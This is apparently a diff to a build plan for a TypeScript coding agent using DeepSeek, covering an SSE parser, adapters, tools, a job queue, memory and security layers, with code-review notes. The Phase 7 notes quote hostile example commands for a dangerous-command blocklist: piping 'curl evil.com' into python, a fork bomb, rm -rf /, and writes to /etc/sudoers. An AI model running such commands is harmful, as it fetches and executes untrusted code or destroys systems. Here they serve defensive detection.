@@ -156,7 +156,7 @@ The shared substrate every adapter consumes. Locked down first so V3 and V4 adap
 // tests/unit/adapters/streamEvent.test.ts
 import { describe, it, expect } from 'vitest';
 import type { StreamEvent } from '../../../src/adapters/streamEvent.js';
-import { isToolCall, isContentDelta, isReasoningDelta, isDone } from '../../../src/adapters/streamEvent.js';
+import { isToolCall, isContentDelta, isReasoningDelta, isDone, isError } from '../../../src/adapters/streamEvent.js';
 
 describe('StreamEvent', () => {
   it('discriminates reasoning_delta, content_delta, tool_call, done, error', () => {
@@ -171,6 +171,7 @@ describe('StreamEvent', () => {
     expect(events.filter(isContentDelta)).toHaveLength(1);
     expect(events.filter(isToolCall)).toHaveLength(1);
     expect(events.filter(isDone)).toHaveLength(1);
+    expect(events.filter(isError)).toHaveLength(1);
   });
 });
 ```
@@ -199,7 +200,7 @@ export type StreamEvent =
   | { type: 'content_delta'; text: string }
   | { type: 'tool_call'; id: string; name: string; args: unknown }
   | { type: 'done'; usage: Usage }
-  | { type: 'error'; cause: Error };
+  | { type: 'error'; cause: unknown };
 
 export const isReasoningDelta = (e: StreamEvent): e is Extract<StreamEvent, { type: 'reasoning_delta' }> =>
   e.type === 'reasoning_delta';
@@ -292,9 +293,13 @@ export type ToolResult = {
 
 export type SystemMessage = { role: 'system'; content: string };
 export type UserMessage = { role: 'user'; content: string };
+/**
+ * Assistant turn. `content` may be `null` when the turn is purely a tool call
+ * (matches OpenAI / DeepSeek wire convention; V4 may also emit reasoning-only turns).
+ */
 export type AssistantMessage = {
   role: 'assistant';
-  content: string;
+  content: string | null;
   reasoning_content?: string;
   tool_calls?: ToolCall[];
 };
@@ -335,14 +340,18 @@ git commit -m "feat(adapters): Message/ToolCall/ToolResult types with R2 helpers
 **Files:**
 
 - Create: `src/transport/sseClient.ts`
-- Test: `tests/unit/adapters/sseClient.test.ts`
+- Test: `tests/unit/transport/sseClient.test.ts` (path mirrors `src/transport/`)
+
+The parser must comply with the SSE spec line-terminator rules (HTML Living Standard §9.2): `\r\n`, `\n`, and bare `\r` are all valid separators. Many real servers (Nginx, Cloudflare) emit CRLF; the parser normalises every chunk to LF before scanning.
+
+`openSseConnection` throws a typed `SseConnectionError` carrying `status`, `statusText`, and the response `body` so callers can surface DeepSeek's structured error envelopes (`{error: {message, type, code}}`).
 
 - [ ] **Step 1: Write the failing test**
 
 ```ts
-// tests/unit/adapters/sseClient.test.ts
-import { describe, it, expect } from 'vitest';
-import { parseSseStream } from '../../../src/transport/sseClient.js';
+// tests/unit/transport/sseClient.test.ts
+import { describe, expect, it } from 'vitest';
+import { SseConnectionError, parseSseStream } from '../../../src/transport/sseClient.js';
 
 const encoder = new TextEncoder();
 
@@ -350,30 +359,69 @@ async function* chunks(...parts: string[]): AsyncIterable<Uint8Array> {
   for (const p of parts) yield encoder.encode(p);
 }
 
+async function collect(stream: AsyncIterable<string>): Promise<string[]> {
+  const out: string[] = [];
+  for await (const e of stream) out.push(e);
+  return out;
+}
+
 describe('parseSseStream', () => {
   it('emits one event per data: line, terminating on [DONE]', async () => {
-    const stream = chunks(
-      'data: {"a":1}\n\n',
-      'data: {"a":2}\n\n',
-      'data: [DONE]\n\n',
+    const events = await collect(
+      parseSseStream(chunks('data: {"a":1}\n\n', 'data: {"a":2}\n\n', 'data: [DONE]\n\n')),
     );
-    const events: string[] = [];
-    for await (const ev of parseSseStream(stream)) events.push(ev);
     expect(events).toEqual(['{"a":1}', '{"a":2}']);
   });
 
   it('reassembles events split mid-chunk', async () => {
-    const stream = chunks('data: {"a"', ':1}\n\nda', 'ta: {"a":2}\n\n', 'data: [DONE]\n\n');
-    const events: string[] = [];
-    for await (const ev of parseSseStream(stream)) events.push(ev);
+    const events = await collect(
+      parseSseStream(chunks('data: {"a"', ':1}\n\nda', 'ta: {"a":2}\n\n', 'data: [DONE]\n\n')),
+    );
     expect(events).toEqual(['{"a":1}', '{"a":2}']);
   });
 
-  it('ignores comment lines and empty data', async () => {
-    const stream = chunks(': keep-alive\n\ndata: {"a":1}\n\ndata: [DONE]\n\n');
-    const events: string[] = [];
-    for await (const ev of parseSseStream(stream)) events.push(ev);
+  it('ignores comment lines and empty data payloads', async () => {
+    const events = await collect(
+      parseSseStream(chunks(': keep-alive\n\ndata: \n\ndata: {"a":1}\n\ndata: [DONE]\n\n')),
+    );
     expect(events).toEqual(['{"a":1}']);
+  });
+
+  it('handles CRLF separators per SSE spec (HTML §9.2)', async () => {
+    const events = await collect(
+      parseSseStream(chunks('data: {"a":1}\r\n\r\ndata: {"a":2}\r\n\r\ndata: [DONE]\r\n\r\n')),
+    );
+    expect(events).toEqual(['{"a":1}', '{"a":2}']);
+  });
+
+  it('handles a CRLF split awkwardly across chunks (CR at end of one, LF at start of next)', async () => {
+    const events = await collect(
+      parseSseStream(chunks('data: {"a":1}\r', '\n\r\ndata: [DONE]\r\n\r\n')),
+    );
+    expect(events).toEqual(['{"a":1}']);
+  });
+
+  it('tolerates trailing whitespace on the [DONE] sentinel', async () => {
+    const events = await collect(parseSseStream(chunks('data: {"a":1}\n\ndata: [DONE]  \n\n')));
+    expect(events).toEqual(['{"a":1}']);
+  });
+
+  it('drains a final event when the stream closes without trailing blank line', async () => {
+    const events = await collect(parseSseStream(chunks('data: {"a":1}')));
+    expect(events).toEqual(['{"a":1}']);
+  });
+});
+
+describe('SseConnectionError', () => {
+  it('carries status, statusText, and body', () => {
+    const err = new SseConnectionError(400, 'Bad Request', '{"error":{"message":"bad arg"}}');
+    expect(err.status).toBe(400);
+    expect(err.statusText).toBe('Bad Request');
+    expect(err.body).toContain('bad arg');
+    expect(err.message).toContain('400');
+    expect(err.message).toContain('bad arg');
+    expect(err.name).toBe('SseConnectionError');
+    expect(err).toBeInstanceOf(Error);
   });
 });
 ```
@@ -381,7 +429,7 @@ describe('parseSseStream', () => {
 - [ ] **Step 2: Run to verify failure**
 
 ```bash
-pnpm test tests/unit/adapters/sseClient.test.ts
+pnpm test tests/unit/transport/sseClient.test.ts
 ```
 
 Expected: FAIL — module not found.
@@ -390,6 +438,10 @@ Expected: FAIL — module not found.
 
 ```ts
 // src/transport/sseClient.ts
+import { Readable } from 'node:stream';
+
+const DATA_PREFIX = 'data:';
+const DATA_PREFIX_LEN = DATA_PREFIX.length;
 const DONE_MARKER = '[DONE]';
 
 export async function* parseSseStream(
@@ -398,29 +450,38 @@ export async function* parseSseStream(
   const decoder = new TextDecoder();
   let buffer = '';
   for await (const chunk of byteStream) {
-    buffer += decoder.decode(chunk, { stream: true });
-    let nl: number;
-    while ((nl = buffer.indexOf('\n\n')) !== -1) {
+    buffer = normaliseLineEndings(buffer + decoder.decode(chunk, { stream: true }));
+    let nl = buffer.indexOf('\n\n');
+    while (nl !== -1) {
       const event = buffer.slice(0, nl);
       buffer = buffer.slice(nl + 2);
+      nl = buffer.indexOf('\n\n');
       const payload = extractDataPayload(event);
       if (payload === null) continue;
       if (payload === DONE_MARKER) return;
       yield payload;
     }
   }
-  // Drain any final event if the stream closed without trailing \n\n.
   if (buffer.length > 0) {
     const payload = extractDataPayload(buffer);
     if (payload !== null && payload !== DONE_MARKER) yield payload;
   }
 }
 
+function normaliseLineEndings(s: string): string {
+  return s.replace(/\r\n?/g, '\n');
+}
+
 function extractDataPayload(event: string): string | null {
   const lines = event.split('\n');
-  const dataLines = lines.filter((l) => l.startsWith('data:'));
+  const dataLines = lines.filter((l) => l.startsWith(DATA_PREFIX));
   if (dataLines.length === 0) return null;
-  return dataLines.map((l) => l.slice(5).trimStart()).join('\n');
+  const joined = dataLines
+    .map((l) => l.slice(DATA_PREFIX_LEN).trimStart())
+    .join('\n')
+    .trimEnd();
+  if (joined.length === 0) return null;
+  return joined;
 }
 
 export type FetchInit = {
@@ -430,33 +491,54 @@ export type FetchInit = {
   signal?: AbortSignal;
 };
 
+export class SseConnectionError extends Error {
+  constructor(
+    public readonly status: number,
+    public readonly statusText: string,
+    public readonly body: string,
+  ) {
+    super(`SSE connection failed: ${status} ${statusText} — ${body || '<empty body>'}`);
+    this.name = 'SseConnectionError';
+  }
+}
+
 export async function openSseConnection(init: FetchInit): Promise<AsyncIterable<Uint8Array>> {
-  const res = await fetch(init.url, {
+  const requestInit: RequestInit = {
     method: 'POST',
     headers: { 'content-type': 'application/json', accept: 'text/event-stream', ...init.headers },
     body: JSON.stringify(init.body),
-    signal: init.signal,
-  });
+  };
+  if (init.signal !== undefined) requestInit.signal = init.signal;
+
+  const res = await fetch(init.url, requestInit);
   if (!res.ok || !res.body) {
-    throw new Error(`SSE connection failed: ${res.status} ${res.statusText}`);
+    let body = '';
+    try {
+      body = res.body ? await res.text() : '';
+    } catch {
+      body = '<failed to read body>';
+    }
+    throw new SseConnectionError(res.status, res.statusText, body);
   }
-  return res.body as unknown as AsyncIterable<Uint8Array>;
+  return Readable.fromWeb(
+    res.body as unknown as Parameters<typeof Readable.fromWeb>[0],
+  ) as unknown as AsyncIterable<Uint8Array>;
 }
 ```
 
 - [ ] **Step 4: Run to verify pass**
 
 ```bash
-pnpm test tests/unit/adapters/sseClient.test.ts
+pnpm test tests/unit/transport/sseClient.test.ts
 ```
 
-Expected: PASS — 3 tests.
+Expected: PASS — 8 tests (7 parser + 1 SseConnectionError).
 
 - [ ] **Step 5: Commit**
 
 ```bash
-git add src/transport/sseClient.ts tests/unit/adapters/sseClient.test.ts
-git commit -m "feat(transport): SSE parser handling chunk splits, comments, [DONE]"
+git add src/transport/sseClient.ts tests/unit/transport/sseClient.test.ts
+git commit -m "feat(transport): SSE parser (CRLF-aware) + typed SseConnectionError"
 ```
 
 ---
@@ -528,6 +610,17 @@ export interface DeepSeekClient {
    * Streams canonical events. Adapters own their wire format end-to-end (R1):
    * the V3 adapter parses JSON tool_calls, the V4 adapter parses DSML markers.
    * Callers consume only StreamEvent.
+   *
+   * Error semantics — the iterator never throws:
+   *   - Pre-stream connection failures (incl. SseConnectionError): yield one
+   *     `{type: 'error', cause}` then return.
+   *   - Mid-stream failures (network drop, decode error): yield
+   *     `{type: 'error', cause}` then return.
+   *   - Per-chunk parse failures: yield `{type: 'error', cause}` and continue
+   *     (other chunks may still parse).
+   *   - Streams always terminate with `{type: 'done', usage}` when the upstream
+   *     reports any terminal `finish_reason` (`stop`, `tool_calls`, `length`,
+   *     `content_filter`); usage fields are zero-filled when upstream omits them.
    */
   stream(req: ChatRequest): AsyncIterable<StreamEvent>;
 
@@ -682,7 +775,8 @@ export function* parseV3Chunk(state: V3StreamState, json: string): Generator<Str
   try {
     chunk = JSON.parse(json) as V3DeltaChunk;
   } catch (cause) {
-    yield { type: 'error', cause: cause instanceof Error ? cause : new Error(String(cause)) };
+    // StreamEvent.error.cause is `unknown`; pass through without lossy wrapping.
+    yield { type: 'error', cause };
     return;
   }
 
@@ -718,7 +812,11 @@ export function* parseV3Chunk(state: V3StreamState, json: string): Generator<Str
       try {
         args = JSON.parse(pending.argsBuffer || '{}');
       } catch (cause) {
-        yield { type: 'error', cause: new Error(`Tool call args JSON parse failed: ${pending.argsBuffer}`, { cause: cause instanceof Error ? cause : undefined }) };
+        // Wrap to add context, but preserve the original cause via Error.cause.
+        yield {
+          type: 'error',
+          cause: new Error(`Tool call args JSON parse failed: ${pending.argsBuffer}`, { cause }),
+        };
         continue;
       }
       yield { type: 'tool_call', id: pending.id, name: pending.name, args };
@@ -758,6 +856,15 @@ git commit -m "feat(adapters/v3): SSE chunk parser yielding canonical StreamEven
 ```
 
 ---
+
+> **Phase 2 review-iteration note:** During Phase 2 execution, code review surfaced refinements applied beyond this spec (commit `7815b9a`):
+>
+> - Parser: emit terminal `done` event on any terminal `finish_reason` (zero-fill usage if missing); flush pending `tool_calls` on any terminal finish (not just `'tool_calls'`); use `typeof === 'string'` + length check to consistently drop empty deltas; treat `length`/`content_filter` as terminal too.
+> - Adapter: `stream()` iterator never throws — pre-stream and mid-stream errors yield `{type: 'error', cause}` then return.
+> - Adapter: `serializeMessage` and `buildRequestBody` extracted as top-level helpers so the V4 adapter can reuse them.
+> - Tests expanded: parser gets `done`-without-usage, empty-delta drop, flush-on-stop, parallel tool calls, zero-arg tools (4→9 tests). Adapter gets wire-shape coverage (R3 `strict` per-function, `tool_choice`, auth header, URL, message serialisation including `null` content), plus pre-stream and mid-stream error-event tests (2→6 tests).
+>
+> Treat the code in `src/adapters/v3/` and the tests under `tests/unit/adapters/v3-*.test.ts` as the source of truth for these iterations. The skeleton spec below remains the bootstrap shape.
 
 ### Task 6: V3 adapter (composes SSE + parser)
 
@@ -1419,6 +1526,18 @@ git commit -m "feat(adapters/v4): adapter composing SSE, DSML parser, V4 message
 
 ---
 
+> **Phase 3 review-iteration note:** During Phase 3 execution, code review surfaced refinements applied beyond Tasks 7–9 specs (commit `<phase-3-fixes>`):
+>
+> - **DSML escape contract (XML 1.0 entity subset)** added to both parser and serializer. String-mode param values, JSON-mode param values, and attribute values (id, name, key) all carry `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&apos;`. The parser unescapes after extraction; the serializer escapes before emission. Closes a silent param-drop bug (parser treated literal `<` in string values as a tag start, consumed `</param>`, dropped the param) and a malformed-DSML round-trip bug (serializer produced unparseable wire format for args containing the entity characters).
+> - **Parser is now mode-aware inside `<param>` values.** When the current pending param is open, the tokeniser scans specifically for `</param>` rather than treating any `<...>` as a tag. Rewritten `consumeBlockSegment` removes the "unknown tag inside block" branch and the trailing-text capture path that depended on it.
+> - **`DsmlParser.flush()` method added.** Emits any tail buffered in content mode as a final `content_delta` (the safe-prefix logic withholds bytes that could start a partial OPEN_BLOCK; once the upstream signals terminal `finish_reason`, those bytes can't be a partial marker any more). Drops incomplete block-mode bytes to refuse silent dispatch of half-formed tool calls.
+> - **Adapter calls `dsml.flush()` on terminal `finish_reason`** before yielding `done`.
+> - **`detectLeakedDsml` is lossless.** Imports `OPEN_BLOCK` and `CLOSE_BLOCK` constants; if upstream emits `OPEN_BLOCK` without a matching close (genuinely malformed), returns the raw text rather than silently dropping it.
+> - **Performance / cleanup:** memoised attribute regexes (no `new RegExp` per tag); `OPEN_BLOCK` and `CLOSE_BLOCK` exported from `dsmlParser.ts` and consumed by `leakFallback.ts` to eliminate the literal duplication.
+> - **Tests expanded:** parser gets 21 new tests (escape entities, attribute escaping, literal `<`-rescue regression, 11-case round-trip property test, buffer-advancement multi-feed regression, three flush() cases, escapeXml/unescapeXml unit). Adapter gets 3 new tests (leak fallback wired through `reasoning_content`, parser flush at terminal, assistant DSML round-trip). Leak fallback gets 2 new tests (trailing content preserved, malformed-leak fallback). Total: 13 → 33 V4 tests; repo total: 41 → 67 tests.
+>
+> Treat the code in `src/adapters/v4/` and the tests under `tests/unit/adapters/v4-*.test.ts` as the source of truth.
+
 ### Task 10: Cross-adapter parity test (V3 vs V4 produce the same StreamEvents for equivalent fixtures)
 
 **Files:**
@@ -1933,6 +2052,27 @@ git commit -m "feat(tools): in-process readFile/writeFile/listDir/grep"
 
 ---
 
+> **Phase 4 review-iteration note:** During Phase 4 execution, code review surfaced fixes applied beyond Tasks 11–13 specs (commit `c04efed`):
+>
+> - **Symlink-loop guard in `grep.ts walk()`.** Switched `stat()` → `lstat()` and added an explicit `isSymbolicLink()` skip. `stat()` resolves symlinks before `isDirectory()` returns, so a circular link (e.g. `~/Desktop/parent` → `~/.`) would loop the BFS until OOM. Sandboxing / traversal policy lives at the security gateway (R11); skipping symlinks here is the conservative behaviour pre-gateway.
+> - **`writeFile.ts` accurate byte count.** Returns `Buffer.byteLength(content, 'utf8')` instead of `content.length` so the "wrote N bytes" string is correct for multi-byte UTF-8 content.
+> - **Test contract strengthening.** Coerce-input contract test confirms registry's `run()` receives the Zod-parsed value (e.g. `42`) rather than raw input (`'42'`); `listDir` assertion tightened to direct equality (the prior `out.split('\n').sort()` re-sort in the test would have masked a regression in the implementation's sort); malformed-regex test (`SyntaxError` propagates through `invoke()` unwrapped); symlink-skip test that locks in the grep fix above (circular `tmp/cyclic/parent_link → tmp`, expects exactly 3 matches, would otherwise hang).
+> - **Generation-time test additions during implementation** (commits `12dd5a3`, `a9fb46b`, `6ed5cd4`): schema (+4 covering number, boolean, unsupported Zod types like `z.union` and `z.tuple`), registry (+5: duplicate-registration rejection, unknown-tool error, result passthrough, empty-capability return, definition count), lightweight tools (+4: parent-dir creation on writeFile, empty-dir on listDir, no-match grep, subdirectory recursion).
+>
+> Test count: 75 → 101 across the phase (98 after implementer commits, 101 after review fixes). Treat the code under `src/tools/` and tests under `tests/unit/tools/` as the source of truth.
+>
+> **Phase 4 review follow-ups deferred to v2:**
+>
+> - `grep.ts` perf: BFS via `queue.shift()` is O(n) per dequeue; replace with a proper queue or DFS for large directory trees.
+> - `grep.ts` correctness: no binary-file detection; reading `.png` / `.sqlite` / compiled objects as UTF-8 produces mojibake. Add an extension allowlist or a null-byte heuristic.
+> - `grep.ts` memory: full-file read into memory before `\n` split; streaming readline (`node:readline`) would bound per-file memory for large files.
+> - `schema.ts`: `zodToStrictJsonSchema(z.string())` (non-object top-level) succeeds but produces `{type:'string'}`, which the DeepSeek API rejects — `parameters` must be `type: object`. Add a top-level `ZodObject` assertion at the entry point.
+> - `schema.ts`: every `instanceof z.ZodX` check is Zod v3-specific; the Zod v4 migration will require updating each branch. Treat as a tools/schema task, not a trivial dep bump.
+> - `registry.ts`: `t.inputSchema as unknown as z.ZodTypeAny` double cast in `definitions()` could collapse to a single cast (cosmetic — both are runtime no-ops).
+> - `schema.ts`: unsupported-Zod-type error message lacks a field-path breadcrumb; nested-schema errors are harder to localise. Optional DX improvement.
+
+---
+
 ## Phase 5 — BullMQ Background Tasks
 
 Heavy I/O (bash, builds, tests) is dispatched to BullMQ jobs (R6). Worker uses `child_process.spawn` (never `exec`). Notification bridge feeds completed jobs back into the orchestrator's history.
@@ -2415,6 +2555,35 @@ git commit -m "test(queue): integration round-trip with real Redis"
 
 ---
 
+> **Phase 5 review-iteration note:** During Phase 5 execution, code review surfaced fixes applied beyond Tasks 14–18 specs (commit `68f7f2b`):
+>
+> - **Important: `bashJob.ts` missing `child.on('error')` handler.** Spawn-time failures (invalid `cwd`, ENOENT, EACCES) emit `error` on the `ChildProcess`; without a listener Node's EventEmitter throws synchronously, surfacing as an `uncaughtException` that would crash the worker process. The Promise then never resolves and BullMQ re-queues the job, compounding the damage. Handler now resolves with `exitCode: null` and surfaces the error in `stderr`, consistent with the existing failure-mode contract.
+> - **Important: `worker.ts` non-idempotent shutdown.** SIGINT + SIGTERM both call `shutdown`; a second call on already-closing connections propagated as an unhandled rejection. Three serial awaits would also leak the QueueEvents subscription and the Redis singleton if `worker.close()` rejected. Now: `shuttingDown` guard flag + try/catch per await so all three close paths run regardless.
+> - **`connection.ts` `closeRedis` defensive `quit()` wrap.** Redis restart mid-shutdown no longer unhandle-rejects; the close is now silently idempotent.
+> - **Integration test `queue.close()` wrapped in try/finally** so the ioredis client doesn't leak when an assertion fails between `queue.add` and `queue.close`.
+> - **Test added:** invalid-cwd spawn failure (`bashJob.test.ts`). Locks in the Important fix above; without the error handler this test would crash the worker.
+>
+> **Pre-flagged inline fixes during implementation** (commits `c46f1aa`–`c731663` plus `a146cbf` docs):
+>
+> - ioredis v5 import shape: `import { Redis }` (named) instead of plan's `import IORedis` (default — removed in v5).
+> - `package.json` `test:integration` script: positional `tests/integration` path (the `--dir` form was silently no-op'd by vitest config's `include` glob).
+> - `bashJob.ts` null-stream guard for `child.stdout`/`child.stderr` (defensive against `noUncheckedIndexedAccess`; never trips at runtime with `stdio: ['ignore', 'pipe', 'pipe']`).
+> - Worker / QueueEvents shared Redis connection — known BullMQ anti-pattern, deferred to v2 in `CLAUDE.md` "Deferred to v2" list.
+>
+> Tests: 101 → 119 unit + 2 integration. Reviewer's race-condition verdict on `bashJob.ts` stream capture: timer/close/data interactions are safe; the missing error handler was the only material lifecycle gap. Exponential backoff (`attempts: 3, type: 'exponential', delay: 2000`) verified correct and per-job overridable. Treat the code under `src/queue/` and tests under `tests/{unit,integration}/queue/` as the source of truth.
+>
+> **Phase 5 review follow-ups deferred to v2:**
+>
+> - `bashJob.ts`: SIGTERM-before-SIGKILL grace period for gentler interactive cancel (current is SIGKILL-immediate).
+> - `bashJob.ts`: UTF-8 multi-byte boundary truncation in `cap()` produces replacement chars at the cap boundary; `TextDecoder({ stream: true })` would fix.
+> - `bashJob.ts`: `maxBytes` cap is per-stream (stdout + stderr each up to 1 MiB); a combined cap would be more predictable for context-budget accounting.
+> - `worker.ts`: `process.exit(0)` on shutdown masks fatal-error-driven shutdowns; should propagate non-zero on error path.
+> - `connection.ts`: `getRedis()` singleton-identity unit test missing (currently only exercised via integration test).
+> - `queues.ts`: `bashQueue()` factory creates a new Queue per call (callers must `queue.close()`); a singleton-style `getBashQueue()` could simplify orchestrator code in Phase 9.
+> - Worker / QueueEvents dual Redis connection split (already in `CLAUDE.md` deferred list).
+
+---
+
 ## Phase 6 — Memory Layer (OpenClaw pattern)
 
 File-backed Markdown persistence under `.myceliate/`. No DB.
@@ -2692,6 +2861,32 @@ Expected: PASS — 3 tests.
 git add src/memory/claudeMd.ts src/memory/conversationLog.ts tests/unit/memory/loaders.test.ts
 git commit -m "feat(memory): CLAUDE.md loader and per-session ConversationLog"
 ```
+
+---
+
+> **Phase 6 review-iteration note:** During Phase 6 execution, code review surfaced fixes applied beyond Tasks 19–20 specs (commit `301d958`):
+>
+> - **Important: ConversationLog init race.** Plan used a boolean `initialized` flag set AFTER `await store.write(...)` in `appendTurn`. Two concurrent `appendTurn` calls on a fresh instance both passed the guard, both called `store.write` (which truncates the file), and the first append's content was silently wiped. Replaced with `initPromise: Promise<void> | null` — the second caller awaits the same write the first kicked off, rather than starting its own. Locked in by a `Promise.all([appendTurn(a), appendTurn(b)])` regression test.
+> - **Important: `storeArtifact` UTF-8 byte semantics.** Plan used `content.length` for both the threshold check and the `ArtifactPointer.bytes` field, but `length` counts UTF-16 code units. A 4096-emoji string has length 8192 but `Buffer.byteLength` 16384; content genuinely 16 KB UTF-8 would slip past a 16 KB cap, and the LLM-facing `bytes` field would carry semantically wrong metadata. Switched both sites to `Buffer.byteLength(content, 'utf8')`. Same pattern as Phase 4's `writeFile.ts` byte-count correction. Locked in by a `'🦆'.repeat(200)` test asserting the threshold offloads at 500 bytes (not 500 code units).
+> - **`readArtifact` JSDoc warning.** Added "Use this method, not `read()`, for artifact paths" — artifact files have no frontmatter block, so `read()` would silently misparse any artifact whose content happens to start with `---\n`.
+>
+> **Additive scope extension during implementation:** the artifact offload primitives (`storeArtifact` / `readArtifact` / `ArtifactPointer`) were Patrick-mandated and NOT in the original plan code. Implemented in the Task 19 commit with deterministic SHA-256 hex-prefix ids (16 chars / 64 bits of entropy) so duplicate large outputs share a single path. Phase 9 orchestrator will plug these into the tool-result injection path; Phase 6's ConversationLog stays untouched.
+>
+> **Pre-flagged inline fixes during implementation** (commits `ddf8cb8`, `d58b94b`):
+>
+> - `type Record` rename to `MdRecord`. Plan's `export type Record = {...}` immediately after `Frontmatter = Record<string, unknown>` had the local declaration shadow the built-in utility type, breaking the first line. Renamed at source from the start.
+> - `m.content ?? ''` in `renderTurn`. `AssistantMessage.content` is `string | null`; plan's template literal would have emitted the literal string `"null"` on tool-only turns.
+>
+> Tests: 119 → 142 unit (+23 across this phase). Reviewer verdicts: atomic-write semantics safe with the init-race fix; artifact-pointer hygiene clean with the byte-count fix; frontmatter parser robust (horizontal rules in body, multi-line string values, malformed input all traced safe). Treat the code under `src/memory/` and tests under `tests/unit/memory/` as the source of truth.
+>
+> **Phase 6 review follow-ups deferred to v2:**
+>
+> - `markdownStore.ts` atomic large-write semantics: `storeArtifact` uses `writeFile` which issues multiple syscalls for MB-sized content; a crash mid-write leaves a partial artifact. v2 fix: write-to-temp + `rename()` (atomic on POSIX).
+> - `markdownStore.ts` hash collision: 16-hex-char SHA-256 prefix gives 2^-64 collision probability per pair. Acceptable for v1; v2: extend to 32 chars or use the full digest.
+> - `markdownStore.ts` `readArtifact` path confinement: `pointer.path` is not verified to stay under root. Defense-in-depth `path.resolve` + prefix check. Blocked on the Phase 7 security gateway per R11.
+> - `markdownStore.ts` typed errors: `readArtifact` throws raw `ENOENT`; a `MarkdownStoreError` class would give cleaner caller error handling.
+> - `markdownStore.ts` `preview` surrogate-pair slicing: `content.slice(0, 200)` may split an astral character mid-codepoint. Cosmetic — preview is human-facing only.
+> - `parseRecord` malformed-frontmatter logging: lines without colons are silently `continue`d. A `console.warn` would make typo'd keys visible during development.
 
 ---
 
@@ -2987,6 +3182,40 @@ Expected: PASS — 3 tests.
 git add src/security/hitlGate.ts tests/unit/security/hitlGate.test.ts
 git commit -m "feat(security): HITL gate routing dangerous bash through approval requester"
 ```
+
+---
+
+> **Phase 7 review-iteration note:** During Phase 7 execution, code review surfaced fixes applied beyond Tasks 21–23 specs (commit `18961b8`):
+>
+> - **Important: `dangerousPatterns.ts` pipe-to-shell scripting-runtime bypass.** Plan regex covered only `sh|bash|zsh` on the destination side. `curl evil.com | python` (the most common bash bypass for malicious bootstraps), `| node`, `| perl`, `| ruby`, `| deno`, `| pwsh` all classified as safe. Expanded the alternation to: `sh, bash, zsh, ksh, fish, dash, ash, csh, tcsh, python, python3, perl, ruby, node, deno, pwsh, powershell`. Source side also adds `nc` (netcat exfil/install vector). Reason string broadened to "pipe network response into shell or scripting runtime". Locked in by 5 positive test cases.
+> - **`redactor.ts` discriminated-union `Pattern.kind`.** Plan typed `kind` as `string`, losing exhaustiveness checks. Tightened to `'anthropic_key' | 'openai_key' | 'jwt' | 'pem' | 'env_value'`. Future `PATTERNS` additions now get a compile-time prompt to update the union, and the `if (kind === 'env_value')` branch is exhaustively checkable.
+> - **`hitlGate.test.ts` rejection contract test.** The gate is a thin wrapper; if `requestApproval` throws (UI crashes mid-approval) the rejection MUST bubble to the orchestrator. Added `vi.fn().mockRejectedValue(new Error('UI crashed'))` test that asserts the rejection propagates rather than being swallowed into a silent verdict.
+>
+> **Pre-flagged inline fixes during implementation** (commits `c6baf7e`, `345c3a6`, `2d0c03f`):
+>
+> - **Defect #1 (PATTERNS ordering).** Plan declared `openai_key` BEFORE `anthropic_key`. The openai regex is greedy on `[A-Za-z0-9_-]{20,}` after `sk-`, so it matched `sk-ant-api03-...` and labeled it as `[REDACTED:openai_key]`. Reordered: anthropic first.
+> - **Defect #2 (`rm -rf` trailing `\b`).** JS regex `\b` requires a transition between word and non-word; `/`, `~`, `*` are non-word, and end-of-string after a non-word char does NOT yield a boundary. So `rm -rf /` (plan's first dangerous test case) silently failed to match. Dropped the trailing `\b` since the path-prefix chars are themselves the discriminator.
+> - **Bookkeeping commit `44abe53`** added two `CLAUDE.md` "Deferred to v2" entries: `\bsudo\b` over-trips on benign mentions, and case-sensitive regex throughout (both intentional v1 conservative-posture choices, formalised at Patrick's instruction).
+>
+> Reviewer verdicts:
+>
+> - **ReDoS:** PEM and JWT patterns confirmed linear in V8/Irregexp under adversarial inputs up to 1 MB (PEM-no-end and JWT-near-miss tested in 1–3 ms).
+> - **HITL gate halt:** truly halting. Suspension blocks dispatch; no memory growth under stuck approval (Promise pending but bounded); race-condition-safe by construction (concurrent calls each get fresh closure); exception propagation correct.
+> - **Blocklist completeness:** closed with the Important fix above.
+>
+> Tests: 142 → 190 unit (+48 across this phase). Treat the code under `src/security/` and tests under `tests/unit/security/` as the source of truth.
+>
+> **Phase 7 review follow-ups deferred to v2:**
+>
+> - `hitlGate.ts`: no timeout on `requestApproval`. v1 indefinite-wait is correct for human approval; production hardening needs `Promise.race` with a configurable timeout + auto-reject fallback.
+> - `hitlGate.ts`: no `AbortSignal` support in `checkBash` for clean cancellation when the orchestrator session is torn down. Phase 10's UI implementation should propagate abort.
+> - `dangerousPatterns.ts`: download-then-exec pattern (`curl ... -o /tmp/x && bash /tmp/x`) is a different attack surface and not yet covered. Needs a separate pattern entry.
+> - `dangerousPatterns.ts`: write-to-privileged-path patterns (`curl ... | tee /etc/cron.d/...`, `... -o /etc/sudoers`). Needs a separate pattern entry.
+> - `dangerousPatterns.ts`: fork-bomb variants with non-`:` function names (`f(){f|f&};f`). Only the canonical form is covered.
+> - `dangerousPatterns.ts`: `init 0`, `systemctl poweroff`, `launchctl reboot` not covered by the power-state pattern.
+> - `dangerousPatterns.ts`: `\bsudo\b` over-trips on benign mentions; case-sensitive regex misses uppercase aliases. Both already in `CLAUDE.md` "Deferred to v2" via commit `44abe53`.
+> - `Verdict` type-name collision: both `dangerousPatterns.ts` and `hitlGate.ts` export a type named `Verdict` with different shapes. Cosmetic; cross-module imports would need aliasing.
+> - `redactor.ts`: generic env-var names (e.g. `MYAPP_TOKEN`) not in the redaction list. Plan-as-written; v2 may broaden via heuristics on `_TOKEN`, `_KEY`, `_SECRET` suffixes.
 
 ---
 
@@ -3549,6 +3778,38 @@ git commit -m "feat(compaction): layer 3 cache-aware micro-compactor (metadata-o
 
 ---
 
+> **Phase 8 review-iteration note:** During Phase 8 execution, code review surfaced cheap robustness wins applied beyond Tasks 24–28 specs (commit `df9120d`). Reviewer found NO Important bugs — all four of Patrick's priority asks (boundary off-by-ones, straddling, idempotence, metadata retention) came back clean. Suggestions folded in:
+>
+> - **Layer 1 idempotence guard.** `toolOutputPruner.ts` previously re-truncated already-truncated content on repeat invocations, drifting the recorded `original N chars` count downward each pass. Added a one-line guard `!content.includes('[truncated:')` so L1 is now strictly idempotent. Locked in by a regression test that runs the pruner twice and asserts byte-identical output.
+> - **`BudgetChecker` constructor validation.** Misconfigured threshold ladders (e.g. `pruneThresholdPct=90, snipThresholdPct=80`) previously produced confusing verdicts silently. Constructor now throws on non-decreasing ordering. Two regression tests cover swapped-pair cases; a third confirms equal adjacent thresholds are accepted.
